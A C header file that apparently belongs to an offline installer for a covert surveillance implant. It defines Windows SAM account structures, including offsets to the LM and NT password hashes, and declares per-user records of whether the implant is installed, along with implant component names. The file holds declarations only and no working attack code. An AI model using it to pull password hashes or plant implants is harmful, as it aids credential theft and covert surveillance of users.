#pragma once
#include "Functions_OS.h"

struct user_V {

  int unknown1_1;      /* 0x00 - always zero? */
  int unknown1_2;      /* 0x04 - points to username? */
  int unknown1_3;      /* 0x08 - always 0x02 0x00 0x01 0x00 ? */

  int username_ofs;    /* 0x0c */
  int username_len;    /* 0x10 */

  int unknown2_1;      /* 0x14 - always zero? */

  int fullname_ofs;    /* 0x18 */
  int fullname_len;    /* 0x1c */

  int unknown3_1;      /* 0x20 - always zero? */

  int comment_ofs;     /* 0x24 */
  int comment_len;     /* 0x28 */

  int unknown4_1;      /* 0x2c - alway zero? */
  int unknown4_2;      /* 0x30 - points 4 or 8 byte field before hashes */
  int unknown4_3;      /* 0x34 - zero? or size? */
  int unknown4_4;      /* 0x38 - zero? */
  int unknown4_5;      /* 0x3c - to field 8 bytes before hashes */
  int unknown4_6;      /* 0x40 - zero? or size of above? */
  int unknown4_7;      /* 0x44 - zero? */

  int homedir_ofs;     /* 0x48 */
  int homedir_len;     /* 0x4c */

  int unknown5_1;      /* 0x50 - zero? */

  int drvletter_ofs;   /* 0x54 - drive letter for home dir */
  int drvletter_len;   /* 0x58 - len of above, usually 4   */

  int unknown6_1;      /* 0x5c - zero? */

  int logonscr_ofs;    /* 0x60 - users logon script path */
  int logonscr_len;    /* 0x64 - length of string */

  int unknown7_1;      /* 0x68 - zero? */

  int profilep_ofs;    /* 0x6c - profile path string */
  int profilep_len;    /* 0x70 - profile path stringlen */

  char unknown7[0x90-0x74]; /* 0x74 */

  int unknown8_1;      /* 0x90 - pointer to some place before hashes, after comments */
  int unknown8_2;      /* 0x94 - size of above? */
  int unknown8_3;      /* 0x98 - unknown? always 1? */

  int lmpw_ofs;        /* 0x9c */
  int lmpw_len;        /* 0xa0 */

  int unknown9_1;      /* 0xa4 - zero? */

  int ntpw_ofs;        /* 0xa8 */
  int ntpw_len;        /* 0xac */

  int unknowna_1;      /* 0xb0 */
  int unknowna_2;      /* 0xb4 - points to field after hashes */
  int unknowna_3;      /* 0xb8 - size of above field */
  int unknowna_4;      /* 0xbc - zero? */
  int unknowna_5;      /* 0xc0 - points to field after that */
  int unknowna_6;      /* 0xc4 - size of above */
  int unknowna_7;      /* 0xc8 - zero ? */

  char data[4];        /* Data starts here. All pointers above is relative to this,
			  that is V + 0xCC */
};

struct user_F {
  char unknown1[8];
  char t_lockout[8];  /* Time of lockout */
  char unknown2[8];
  char t_creation[8]; /* Time of account creation */
  char unknown3[8];
  char t_login[8];    /* Time of last login */
  long rid;
  char unknown4[4];
  unsigned short ACB_bits;  /* Account type and status flags */
  char unknown5[6];
  unsigned short failedcnt; /* Count of failed logins, if > than policy it is locked */
  unsigned short logins;    /* Total logins since creation */
  char unknown6 [0xc];
  };


typedef struct users_struct {
	WCHAR *user_name;
	WCHAR *full_name;
	WCHAR *desc;
	WCHAR *user_temp;
	WCHAR *user_local_settings;
	WCHAR *user_home;
	WCHAR *user_startup;
	WCHAR *user_hash;
	BOOL is_admin;
	BOOL is_local;
	BOOL is_disabled;
#define RCS_CLEAN	  0
#define RCS_INSTALLED 1
#define RCS_BROKEN	  2
	DWORD rcs_status;
	DWORD list_index;

	struct users_struct *next;
} users_struct_t;

typedef struct rcs_struct {
	WCHAR rcs_ini_path[MAX_PATH];
	WCHAR rcs_files_path[MAX_PATH];
	WCHAR hdir[128];
	WCHAR hreg[128];
	WCHAR new_hdir[128];
	WCHAR old_hreg[128];
	WCHAR hcore[128];
	WCHAR hdrv[128];
	WCHAR hdrv64[128];
	WCHAR hsys[128];
	WCHAR rcs_name[128];
	WCHAR soldier_name[128];
	WCHAR func_name[24];
	WCHAR version[128];
	WCHAR **masks;
	DWORD hscramb;
} rcs_struct_t;

extern users_struct_t *GetUserList(os_struct_t *os_info, rcs_struct_t *rcs_info);
extern void FreeUsersList(users_struct_t *list_head);
extern DWORD GetUserRCSStateImg(users_struct_t *user_info);
extern DWORD GetUserPrivImg(users_struct_t *user_info);
extern users_struct_t *FindUser(DWORD index, users_struct_t *list_head);